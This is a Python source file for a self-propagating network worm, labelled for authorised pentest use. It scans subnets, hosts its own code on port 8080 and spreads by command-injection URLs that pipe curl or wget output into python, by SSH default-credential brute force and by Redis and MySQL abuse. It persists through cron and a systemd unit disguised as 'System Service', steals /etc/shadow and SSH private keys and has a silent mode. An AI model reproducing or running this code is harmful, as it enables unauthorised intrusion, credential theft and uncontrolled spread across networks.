#!/usr/bin/env python3
"""
Universal Network Worm v3.1 - FULLY DYNAMIC SELF-PROPAGATING
AUTHORIZED PENTEST USE ONLY
"""

import socket
import subprocess
import threading
import time
import random
import os
import sys
import json
import base64
import requests
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
import urllib.parse
import ssl

class UniversalWorm:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.interfaces = self.get_all_interfaces()
        self.self_ip = self.get_self_ip()
        self.self_url = f"http://{self.self_ip}:8080"
        self.subnets = self.discover_subnets()
        self.common_ports = [22, 80, 443, 8080, 8443, 3000, 5000, 9000, 8888, 3306, 5432, 6379]
        self.exploit_modules = self.load_exploit_modules()
        self.infected = set()
        self.c2_urls = self.get_fallback_c2()  # Optional external fallback
        
        # Self-host immediately
        threading.Thread(target=self.start_drop_server, daemon=True).start()
        print(f"[*] 🪱 DYNAMIC WORM v3.1 → {self.hostname} → SELF_IP={self.self_ip}", flush=True)

    def get_self_ip(self):
        """🚀 Dynamic self-discovery - works EVERYWHERE"""
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: self.get_route_ip(),
            lambda: self.get_external_ip(),
            lambda: "127.0.0.1"  # Failsafe
        ]
        for method in methods:
            try:
                ip = method()
                if ip != "127.0.0.1" and not ip.startswith("169.254"):  # Skip link-local
                    return ip
            except:
                continue
        return "127.0.0.1"

    def get_route_ip(self):
        """Get IP via route lookup"""
        result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True)
        return result.stdout.split()[6]

    def get_external_ip(self):
        """Stupid simple - works on most networks"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def start_drop_server(self):
        """🎯 Auto-start HTTP server hosting self"""
        try:
            # Copy self to /tmp for serving
            tmp_path = "/tmp/worm.py"
            with open(__file__, 'r') as f:
                content = f.read()
            with open(tmp_path, 'w') as f:
                f.write(content)
            os.chmod(tmp_path, 0o755)
            
            # Start HTTP server (non-blocking)
            import http.server
            import socketserver
            Handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("", 8080), Handler) as httpd:
                print(f"[+] 🚀 Self-hosting worm at {self.self_url}", flush=True)
                httpd.serve_forever()
        except Exception as e:
            print(f"[!] Drop server failed: {e}", flush=True)

    def get_all_interfaces(self):
        """Discover ALL network interfaces and IPs"""
        interfaces = {}
        try:
            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    parts = line.split()
                    iface = parts[1].replace(':', '')
                    ip = parts[3].split('/')[0]
                    interfaces[iface] = ip
        except:
            interfaces['lo'] = '127.0.0.1'
        return interfaces

    def discover_subnets(self):
        """Dynamic subnet discovery"""
        subnets = []
        for iface, ip in self.interfaces.items():
            if ip == '127.0.0.1':
                continue
            base = ".".join(ip.split('.')[:-1]) + "."
            subnets.append(base)
            
            # Common ranges
            if '10.' in ip:
                subnets.extend(['10.0.0.', '10.1.0.', '10.2.0.'])
            elif '172.' in ip:
                subnets.extend(['172.16.0.', '172.17.0.', '172.18.0.'])
            elif '192.168.' in ip:
                subnets.extend(['192.168.0.', '192.168.1.'])
                
        return list(set(subnets))

    def get_fallback_c2(self):
        """Optional external C2 (for exfil only)"""
        return []  # Empty = pure peer-to-peer

    def load_exploit_modules(self):
        """Dynamic exploit loading"""
        return {
            22: self.ssh_bruteforce,
            80: self.http_rce,
            443: self.http_rce,
            8080: self.http_rce,
            3000: self.http_rce,
            5000: self.http_rce,
            3306: self.mysql_exploit,
            5432: self.pg_exploit,
            6379: self.redis_exploit
        }

    def generate_hosts(self):
        """Generate 10k+ target IPs dynamically"""
        hosts = []
        for subnet in self.subnets:
            for i in range(1, 255):
                hosts.append(f"{subnet}{i}")
        hosts.extend([
            "localhost", "127.0.0.1", "::1",
            "gateway", "router", "dns", "web", "api", "db"
        ])
        return hosts[:10000]

    def scan_port(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def mass_scan(self, hosts):
        """Parallel port scanning"""
        open_hosts = {}
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {
                executor.submit(self.scan_services, host): host 
                for host in random.sample(hosts, min(500, len(hosts)))
            }
            for future in futures:
                host = futures[future]
                try:
                    services = future.result(timeout=10)
                    if services:
                        open_hosts[host] = services
                except:
                    pass
        return open_hosts

    def scan_services(self, host):
        """Scan common services on host"""
        services = {}
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.scan_port, host, port): port 
                      for port in self.common_ports}
            for future in futures:
                port = futures[future]
                if future.result():
                    services[port] = True
        return services if services else None

    # === DYNAMIC SELF-PROPAGATING EXPLOITS ===

    def http_rce(self, host, port=80):
        """🔥 SELF-PROPAGATING HTTP RCE - uses victim's OWN IP!"""
        target_url = f"http://{host}:{port}"
        self_host_cmd = f"wget -q -O /tmp/worm.py {self.self_url}/worm.py"
        curl_host_cmd = f"curl -s {self.self_url}/worm.py | python3 -"
        
        payloads = [
            # Direct command injection
            f"{target_url}/ping?ip=127.0.0.1;{self_host_cmd}",
            f"{target_url}/exec?cmd={urllib.parse.quote(self_host_cmd)}",
            f"{target_url}/?q=;{urllib.parse.quote(self_host_cmd)}",
            
            # SSRF chain
            f"{target_url}/api?url={urllib.parse.quote(self.self_url)}",
            
            # One-liners
            f"{target_url}/shell?cmd={urllib.parse.quote(curl_host_cmd)}",
            f"{target_url}/debug?exec={urllib.parse.quote('python3 -c \"import urllib.request; exec(urllib.request.urlopen(\\'{self.self_url}/worm.py\\').read())\"')}"
        ]
        
        for payload in payloads:
            try:
                requests.get(payload, timeout=3, verify=False)
                print(f"[+] HTTP→{host}:{port} via {self.self_url}", flush=True)
                self.infected.add(host)
                return True
            except:
                continue
        return False

    def ssh_bruteforce(self, host):
        """SSH propagation using self-hosted payload"""
        creds = [
            ('root', 'root'), ('admin', 'admin'), ('pi', 'raspberry'),
            ('ubuntu', 'ubuntu'), ('ec2-user', ''), ('centos', 'centos')
        ]
        
        payload = f"wget -q -O/tmp/worm.py {self.self_url}/worm.py && nohup python3 /tmp/worm.py silent &"
        
        for user, pwd in creds:
            try:
                subprocess.run(['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
                               f'{user}@{host}', payload], timeout=5, capture_output=True)
                print(f"[+] SSH→{host}:{user} via {self.self_url}", flush=True)
                self.infected.add(host)
                return True
            except:
                continue
        return False

    def mysql_exploit(self, host):
        """MySQL UDF + self-propagation"""
        payload = f"SELECT LOAD_FILE('{self.self_url}/worm.py')"
        try:
            subprocess.run([
                'mysql', '-h', host, '-u', 'root', '', '-e', payload
            ], timeout=5, capture_output=True)
            print(f"[+] MySQL→{host} via {self.self_url}", flush=True)
            self.infected.add(host)
            return True
        except:
            return False

    def pg_exploit(self, host):
        """PostgreSQL exploits"""
        return False

    def redis_exploit(self, host):
        """Redis RCE → write self-hosted worm"""
        try:
            sock = socket.socket()
            sock.connect((host, 6379))
            redis_cmd = f"*3\r\n$3\r\nSET\r\n$3\r\nx\r\n$100\r\nwget -q -O/tmp/worm.py {self.self_url}/worm.py && chmod +x /tmp/worm.py && nohup /tmp/worm.py silent &\n"
            sock.send(redis_cmd.encode())
            sock.close()
            print(f"[+] Redis→{host} via {self.self_url}", flush=True)
            self.infected.add(host)
            return True
        except:
            return False

    def infect_host(self, host, services):
        """Main infection routine"""
        print(f"[>] 🦠 Infecting {host} → {list(services.keys())} via {self.self_url}", flush=True)
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for port in services:
                if port in self.exploit_modules:
                    futures.append(
                        executor.submit(self.exploit_modules[port], host, port)
                    )
            
            for future in futures:
                try:
                    future.result(timeout=10)
                except:
                    pass

    def persistence(self):
        """Multi-vector persistence"""
        paths = ["/tmp/worm.py", "/var/tmp/worm", "/dev/shm/worm", "~/.worm/worm.py"]
        for path in paths:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(__file__, 'r') as f:
                    content = f.read()
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o755)
                
                # Cron persistence
                cron_job = f"@reboot python3 {path} silent\n"
                subprocess.run(['crontab', '-l'], capture_output=True, check=False)
                subprocess.run(['(crontab -l 2>/dev/null; echo "{}") | crontab -'.format(cron_job)], shell=True)
                
                # Systemd
                service = f"""[Unit]
Description=System Service
[Service]
ExecStart=/usr/bin/python3 {path} silent
Restart=always
[Install]
WantedBy=multi-user.target"""
                with open("/etc/systemd/system/worm.service", "w") as f:
                    f.write(service)
                subprocess.run(["systemctl", "daemon-reload"], check=False)
                subprocess.run(["systemctl", "enable", "worm.service"], check=False)
                
                print(f"[+] ✅ Persisted to {path}", flush=True)
                break
            except:
                continue

    def exfiltrate(self, host):
        """Steal files → send to OTHER infected hosts (P2P)"""
        interesting = ["/etc/passwd", "/etc/shadow", "~/.ssh/id_rsa", "/proc/version", "/etc/hosts"]
        for file in interesting:
            try:
                with open(file, 'r') as f:
                    data = f.read()[:1000]  # Truncate
                    loot = base64.b64encode(data.encode()).decode()
                    
                    # P2P exfil - send to other infected hosts
                    for victim in list(self.infected)[:3]:
                        try:
                            requests.post(f"http://{victim}:8080/loot", 
                                        json={"from": self.self_ip, "target": host, "file": file, "data": loot},
                                        timeout=5)
                        except:
                            pass
            except:
                pass

    def main(self):
        print(f"[*] 🌐 FULLY DYNAMIC DEPLOYMENT → SELF_IP={self.self_ip} → {len(self.subnets)} subnets", flush=True)
        
        # Phase 1: Persist + Self-host
        self.persistence()
        
        # Phase 2: Mass discovery
        hosts = self.generate_hosts()
        print(f"[*] 🔍 Scanning {len(hosts)} hosts...", flush=True)
        
        open_hosts = self.mass_scan(hosts)
        print(f"[+] 🎯 {len(open_hosts)} vulnerable hosts found!", flush=True)
        
        # Phase 3: Infection campaign
        for host, services in open_hosts.items():
            if host not in self.infected:
                threading.Thread(target=self.infect_host, args=(host, services), daemon=True).start()
                self.exfiltrate(host)
        
        # Phase 4: Eternal propagation
        while True:
            time.sleep(random.randint(60, 300))
            new_hosts = self.mass_scan(random.sample(hosts, 100))
            for host, services in new_hosts.items():
                if host not in self.infected:
                    threading.Thread(target=self.infect_host, args=(host, services), daemon=True).start()

def silent_run():
    """Stealth mode"""
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = sys.stdout
    UniversalWorm().main()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'silent':
        silent_run()
    else:
        UniversalWorm().main()